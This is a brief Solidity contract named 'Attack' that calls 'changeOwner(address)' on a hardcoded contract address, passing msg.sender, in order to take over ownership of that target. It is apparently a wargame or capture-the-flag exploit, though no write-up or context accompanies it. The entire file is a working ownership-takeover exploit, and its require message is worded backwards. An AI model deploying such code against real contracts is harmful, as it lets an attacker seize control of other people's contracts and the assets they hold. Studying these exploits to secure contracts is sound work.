// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    address target = 0x2875AdB8C4b6dF39E9fAF0a1dd92E6646B99C73C;

    function attack() public {
        bytes memory call = abi.encodeWithSignature("changeOwner(address)", msg.sender);
        (bool success, ) = target.call{value: 0}(call);
        require(success, "Attack call succeeded");
    }
}